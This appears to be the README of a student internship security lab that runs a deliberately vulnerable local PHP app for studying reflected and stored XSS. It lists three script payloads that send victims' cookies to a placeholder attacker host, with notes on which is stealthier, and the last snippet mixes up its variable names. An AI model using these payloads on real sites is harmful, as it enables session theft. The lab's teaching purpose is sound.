# Internship cyber security course
This repository collects tools and methodologies used in the context of system security intership
## Start the Lab
- Install docker for windows
- Clone\download this repository
- Start docker
- Open a command prompt inside the project root directory and execute the following command:

  		docker compose up --build
- Visit the vulnerable app at: http://localhost:9000/xss.php

## Students
1. Dario Collini
2. Andrea Di Caro
## Analyzed vulnerabilities
- XSS reflected
- XSS stored

## Payloads
### Reflected
    <script>window.location.href="http://<attacker IP>:8000/a.html?c="+document.cookie</script>
### Stored
Not the best approach, generates a bunch of requests, very loud

    <img src="x" onerror=this.src='http://<attacker IP>:8000/'+document.cookie; />
More stealth, use this one

    <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>


## TODO Andrea & Dario
1. describe the analyzed vulnerabilites (you can use external references)
1. describe the attacks scenario
1. describe the mitigation actions

